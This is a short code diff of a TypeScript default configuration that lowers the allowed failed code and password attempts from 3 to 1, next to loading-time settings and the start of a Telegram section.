@@ -13,8 +13,8 @@ interface Config {
 const defaultConfig: Config = {
   settings: {
     code_loading_time: 1000,
-    max_failed_code_attempts: 3,
-    max_failed_password_attempts: 3,
+    max_failed_code_attempts: 1,
+    max_failed_password_attempts: 1,
     password_loading_time: 1000,
   },
   telegram: {
